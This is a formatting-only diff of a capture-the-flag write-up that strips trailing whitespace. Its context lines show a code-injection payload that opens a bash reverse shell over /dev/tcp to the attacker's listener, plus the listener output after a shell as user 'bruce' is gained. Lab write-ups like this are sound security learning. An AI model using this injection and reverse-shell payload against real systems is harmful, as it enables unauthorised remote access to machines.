@@ -30,14 +30,14 @@ So, we have 2 ports. Port 22 (ssh) and Port 5000 (http).
 We can also download the source code of the website.
 
 ```bash
-kali@kali:unzip source.zip                                                                                                                      
+kali@kali:unzip source.zip
 Archive:  source.zip
    creating: math/
-  inflating: math/quadratic.py       
+  inflating: math/quadratic.py
    creating: math/templates/
-  inflating: math/templates/index.html  
-  inflating: math/app.py             
-  inflating: math/bisection.py       
+  inflating: math/templates/index.html
+  inflating: math/app.py
+  inflating: math/bisection.py
   inflating: math/prime.py
 ```
 
@@ -152,7 +152,7 @@ This will help us, "*https://github.com/letta-ai/letta/issues/2613*".
 Start a listener 
 
 ```bash
-kali@kali:penelope -p 4444                                                                                                                      
+kali@kali:penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 ```
@@ -178,15 +178,15 @@ xa=__import__('os').system("bash+-c+'bash+-i+>%26+/dev/tcp/192.168.130.26/4444+0
 ```
 
 ```bash
-kali@kali: penelope -p 4444                                                                                                                      
+kali@kali: penelope -p 4444
 [+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.83 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
 ➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
 [+] Got reverse shell from ip-10-49-142-157~10.49.142.157-Linux-x86_64 😍 Assigned SessionID <1>
 [+] Attempting to upgrade shell to PTY...
 [+] Shell upgraded successfully using /usr/bin/python3! 💪
-[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
+[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
 [+] Logging to /home/kali/.penelope/sessions/ip-10-49-142-157~10.49.142.157-Linux-x86_64/2026_02_16-12_28_06-603.log 📜
-──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 bruce@ip-10-49-142-157:~$ id
 uid=1000(bruce) gid=1000(bruce) groups=1000(bruce)
 ```
